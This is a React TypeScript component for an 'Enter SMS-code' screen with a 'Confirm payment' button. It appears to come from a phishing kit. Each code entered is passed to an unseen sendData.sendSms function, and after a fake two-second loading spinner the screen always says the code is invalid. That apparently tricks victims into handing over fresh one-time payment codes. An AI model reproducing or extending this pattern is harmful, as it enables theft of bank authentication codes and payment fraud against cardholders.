import React, { useEffect, useState } from "react";
import styles from "./Sms.module.css";
import MainInput from "../MainInput/MainInput.tsx";
import errorIcon from "../../../images/errorIcon.svg";
import MainButton from "../MainButton/MainButton.tsx";
import sendData from "../../sendData.ts";

type Props = {};

const Sms = (props: Props) => {
  const [sms, setSms] = useState("");
  const [isSmsValid, setIsSmsValid] = useState(true);
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    if (sms.length < 6) {
      setIsSmsValid(false);
    } else {
      setIsSmsValid(true);
    }
    if (sms.length < 3) {
      setIsSmsValid(true);
    }
  }, [sms]);

  const sendSms = () => {
    if (sms.length >= 4) {
      sendData.sendSms(sms);
      setIsLoading(true);
      setTimeout(() => {
        setIsLoading(false);
        setSms("");
        setTimeout(() => {
          setIsSmsValid(false);
        }, 100);
      }, 2000);
    }
  };

  return (
    <>
      <div
        className={styles.loading}
        style={{ display: isLoading ? "flex" : "none" }}
      >
        <div className={styles["lds-roller"]}>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
        </div>
      </div>
      <div className={styles.sms}>
        <h1 className={styles.title}>Enter SMS-code</h1>
        <div className={styles.inputBoxWithError}>
          <MainInput
            type="string"
            placeholder="SMS"
            value={sms}
            onChangeFunc={setSms}
            width="100%"
            maxLenght={6}
          />
          <div
            className={styles.errorBox}
            style={{ display: !isSmsValid ? "flex" : "none" }}
          >
            <img src={errorIcon} alt="" />
            <p>Sms-code is invalid!</p>
          </div>
        </div>
        <MainButton text="Confirm payment" callback={sendSms} />
      </div>
    </>
  );
};

export default Sms;
